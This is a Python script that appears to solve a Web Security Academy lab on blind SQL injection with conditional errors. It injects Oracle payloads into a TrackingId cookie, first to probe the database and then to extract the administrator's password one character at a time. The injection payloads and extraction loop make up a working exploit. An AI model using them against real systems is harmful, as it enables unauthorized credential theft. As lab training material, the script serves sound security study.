# SQL injection 35 of 51
# Lab: Blind SQL injection with conditional errors

import asyncio
from common.base import run_payloads

# RAW request (from Burp Intruder) with placeholders like §1§, §2§... or §CODE§, §USER§
RAW_REQUEST = """
GET /filter?category=Pets HTTP/2
Host: 0a00003a0497538b804c08d6005b004e.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:154.0) Gecko/20100101 Firefox/154.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br, zstd
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Referer: https://0a00003a0497538b804c08d6005b004e.web-security-academy.net/
Cookie: session=VjncAOXHmKXGks4abbCV5N38OfOPePI8; TrackingId=eBPPhE534sOJOMao@@@PAYLOAD@@@
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
TE: trailers
""".strip()

async def one_call(raw_req):
    """A simple call. Returns the response"""

    result = await run_payloads(raw_req, [{}], lambda x: True)
    return result

async def print_net_result(raw_req):
    result = await one_call(raw_req)
    if result['status_code'] == 200:
        print(f" CALL OK")
        return True
    else:
        print(" CALL FAILED")
        return False

async def main():

    # Phase 1: Check the plain call
    raw_req_1 = RAW_REQUEST.replace("@@@PAYLOAD@@@", "")
    print('PLAIN CALL:', end='')
    await print_net_result(raw_req_1)

    raw_req_2 = RAW_REQUEST.replace("@@@PAYLOAD@@@", "'")
    print('WITH ERROR CALL:', end='')
    await print_net_result(raw_req_2)

    raw_req_3 = RAW_REQUEST.replace("@@@PAYLOAD@@@", "''")
    print('WITHOUT ERROR (but with db check) CALL:', end='')
    await print_net_result(raw_req_3)

    raw_req_4a = RAW_REQUEST.replace("@@@PAYLOAD@@@", """'||(SELECT '')||'""")
    print('WITHOUT ERROR (if sql) CALL:', end='')
    await print_net_result(raw_req_4a)
    
    raw_req_4b = RAW_REQUEST.replace("@@@PAYLOAD@@@", """'||(SELECT '' from dual)||'""")
    print('WITHOUT ERROR (if oracle) CALL:', end='')
    await print_net_result(raw_req_4b)

    raw_req_5 = RAW_REQUEST.replace("@@@PAYLOAD@@@", """'||(SELECT '' FROM not_a_real_table)||'""")
    print('Oracle fake table:', end='')
    await print_net_result(raw_req_5)

    # WHERE ROWNUM=1 is important because more than one results would break the concatenation!
    raw_req_6 = RAW_REQUEST.replace("@@@PAYLOAD@@@", """'||(SELECT '' FROM users WHERE ROWNUM = 1)||'""")
    print('Oracle table "users":', end='')
    await print_net_result(raw_req_6)

    raw_req_7 = RAW_REQUEST.replace("@@@PAYLOAD@@@", """'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'""")
    print('Oracle error test:', end='')
    await print_net_result(raw_req_7)

    raw_req_8 = RAW_REQUEST.replace("@@@PAYLOAD@@@", """'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'""")
    print('Oracle non-error test:', end='')
    await print_net_result(raw_req_8)

    raw_req_9 = RAW_REQUEST.replace("@@@PAYLOAD@@@", """'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'""")
    print('Oracle administrator test:', end='')
    await print_net_result(raw_req_9)

    # We could use "greather than" instead of "equals" and use binary search for the length, but I kept it simple!
    pwd_len = None
    for i in range(1, 40):
        payload = """'||(SELECT CASE WHEN LENGTH(password)<>@@@LEN@@@ THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'""".replace("@@@LEN@@@", str(i))
        raw_req_10 = RAW_REQUEST.replace("@@@PAYLOAD@@@", payload)
        print(f'Oracle administrator password length {i}:', end='')
        if await print_net_result(raw_req_10):
            pwd_len = i
            break

    import string
    pwd = ''
    charset = string.ascii_lowercase + string.ascii_uppercase + string.digits
    for i in range(1, pwd_len+1):
        for c in charset:
            payload = f"""'||(SELECT CASE WHEN SUBSTR(password,{i},1)='{c}' THEN '' ELSE TO_CHAR(1/0) END FROM users WHERE username='administrator')||'"""
            raw_req_14 = RAW_REQUEST.replace("@@@PAYLOAD@@@", payload)
            print(f'Oracle administrator password {c} in position {i+1}:', end='')
            if await print_net_result(raw_req_14):
                pwd += c
                print(f'Password so far: {pwd}')
                break
    

if __name__ == "__main__":
    asyncio.run(main())